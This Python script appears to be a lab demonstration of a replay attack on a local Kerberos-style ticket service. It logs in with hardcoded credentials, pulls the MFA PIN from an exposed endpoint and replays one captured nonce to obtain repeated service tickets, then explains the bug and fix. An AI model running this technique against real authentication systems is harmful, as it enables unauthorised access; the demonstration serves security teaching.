import sys
import time
import uuid
import requests

BASE = "http://localhost:5000"

RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"


def banner():
    print(f"\n{BOLD}{CYAN}{'═'*64}")
    print("  ATTACK 1 — REPLAY ATTACK")
    print(f"{'═'*64}{RESET}")


def vuln(msg): print(f"  {RED}[VULN]  {msg}{RESET}")
def info(msg): print(f"  {YELLOW}[INFO]  {msg}{RESET}")
def step(msg): print(f"\n  {BOLD}» {msg}{RESET}")
def show(k, v): print(f"     {CYAN}{k:<32}{RESET}{v}")
def boom(msg): print(f"\n  {BOLD}{RED}💥 EXPLOITED: {msg}{RESET}")
def safe(msg): print(f"\n  {BOLD}{GREEN}✓  BLOCKED:   {msg}{RESET}")


def mfa_login(username: str, password: str) -> str:
    """2-step MFA-aware login. Returns TGT token or exits on failure."""
    # Step 1 — password
    r1 = requests.post(f"{BASE}/login", json={"username": username, "password": password})
    if not r1.ok:
        print(f"{RED}  Login step-1 failed: {r1.json()}{RESET}")
        sys.exit(1)

    body1 = r1.json()

    # If MFA is not enabled the TGT comes back directly
    if "tgt" in body1:
        return body1["tgt"]

    if not body1.get("mfa_required"):
        print(f"{RED}  Unexpected login response: {body1}{RESET}")
        sys.exit(1)

    # Step 2 — fetch PIN from MFA terminal endpoint and submit it
    info("MFA required — fetching PIN from /mfa/pending …")
    pin = None
    for _ in range(15):          # wait up to ~3 seconds
        time.sleep(0.2)
        try:
            rp = requests.get(f"{BASE}/mfa/pending", timeout=2)
            for entry in rp.json().get("pending", []):
                if entry["username"] == username:
                    pin = entry["pin"]
                    break
        except Exception:
            pass
        if pin:
            break

    if not pin:
        print(f"{RED}  Could not retrieve MFA PIN for '{username}'{RESET}")
        sys.exit(1)

    show("MFA PIN retrieved:", pin)
    r2 = requests.post(f"{BASE}/login/mfa", json={"username": username, "pin": pin})
    if not r2.ok:
        print(f"{RED}  MFA step-2 failed: {r2.json()}{RESET}")
        sys.exit(1)
    return r2.json()["tgt"]


def main():
    banner()

    vuln("ReplayProtection.check_and_register() always returns True.")
    vuln("Nonces are never stored — same authenticator replayed indefinitely.")

    # Check server is up
    try:
        requests.get(f"{BASE}/health", timeout=3)
    except requests.ConnectionError:
        print(f"\n{RED}  Cannot connect to {BASE} — run: python app.py{RESET}")
        sys.exit(1)

    # Step 1: Login as bob (MFA-aware)
    step("Step 1: bob logs in and gets a TGT")
    tgt = mfa_login("bob", "Manager@2024")
    show("Login status:", "HTTP 200 — TGT obtained ✓")

    # Step 2: Capture one specific nonce + timestamp
    step("Step 2: Legitimate TGS exchange — capture the authenticator (nonce + timestamp)")
    nonce     = str(uuid.uuid4())
    timestamp = time.time()

    r_legit = requests.post(f"{BASE}/request-ticket", json={
        "tgt":           tgt,
        "service":       "resource_server",
        "authenticator": {"nonce": nonce, "timestamp": timestamp},
    })
    show("Captured nonce:",       nonce[:20] + "...")
    show("Captured timestamp:",   str(timestamp))
    show("Legitimate response:",  f"HTTP {r_legit.status_code} — {'ticket issued ✓' if r_legit.ok else 'FAILED'}")

    # Step 3: Replay the same authenticator 3 times
    step("Step 3: Attacker replays the IDENTICAL nonce + timestamp 3 times")
    info("In a secure system, attempts 1-3 should all return HTTP 401 REPLAY_DETECTED")

    all_allowed = True
    for attempt in range(1, 4):
        r = requests.post(f"{BASE}/request-ticket", json={
            "tgt":           tgt,
            "service":       "resource_server",
            "authenticator": {"nonce": nonce, "timestamp": timestamp},  # SAME nonce!
        })
        if r.ok:
            label = f"{RED}ticket issued ← EXPLOIT #{attempt}{RESET}"
        else:
            label = f"{GREEN}BLOCKED (HTTP {r.status_code}){RESET}"
            all_allowed = False
        show(f"Replay attempt {attempt}:", f"HTTP {r.status_code} — {label}")

    # Result
    if all_allowed:
        boom("Replayed authenticator accepted every time — attacker gets unlimited service tickets")
    else:
        safe("At least one replay was blocked")

    step("Root Cause & Fix")
    info("File:  security.py → class ReplayProtection")
    info("Bug:   check_and_register() returns True unconditionally.")
    info("Fix:   Store each nonce in a dict with its expiry time.")
    info("       Reject any nonce seen within the time window (300 s).")
    print()


if __name__ == "__main__":
    main()